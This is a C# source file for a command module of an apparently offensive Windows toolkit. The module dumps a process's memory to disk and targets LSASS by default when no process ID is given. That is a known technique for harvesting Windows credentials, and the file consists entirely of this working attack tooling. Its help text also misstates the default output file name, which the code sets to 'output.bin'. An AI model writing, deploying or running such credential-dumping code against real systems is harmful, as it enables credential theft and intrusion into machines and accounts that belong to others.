using System;
using System.Collections.Generic;
using SharpSploit.Enumeration;

using SharpAttack.Utils;
namespace SharpAttack.Commands
{
  class DumpProcess : Command
  {

    public override void Run(Dictionary<String, Parameter> RunParams)
    {
      int id = -1;
      string OutputPath = Host.GetCurrentDirectory();
      string OutputName = "output.bin";

      if (RunParams.TryGetValue("PID", out Parameter pid))
      {
        id = int.Parse(pid.Value[0]);
      }

      if (RunParams.TryGetValue("OutputPath", out Parameter outpath))
      {
        OutputPath = outpath.Value[0];
      }

      if (RunParams.TryGetValue("OutputName", out Parameter outname))
      {
        OutputName = outname.Value[0];
      }

      if (id < 0)
      {
        try
        {
          Host.CreateProcessDump("lsass", OutputPath, OutputName);
          Printing.Success($"Dump created at {OutputPath}\\{OutputName}");
        }
        catch
        {
          Printing.Error($"Error creating process dump.");
        }
      }
      else
      {
        try
        {
          Host.CreateProcessDump(id, OutputPath, OutputName);
          Printing.Success($"Dump created at {OutputPath}\\{OutputName}");
        }
        catch
        {
          Printing.Error($"Error creating process dump.");
        }
      }
    }

    public DumpProcess()
    {
      Name = "DumpProcess";
      Helptext = "Dumps the memory of a given process";
      Parameters.Add("PID", new Parameter("ID of the process to dump. Defaults to LSASS", 0));
      Parameters.Add("OutputPath", new Parameter("The path to save the dump. Defaults to current directory", 1));
      Parameters.Add("OutputName", new Parameter("Name to save the dump as. Defaults to <processname>_<pid>.dmp", 2));
      Register();
    }
  }
}
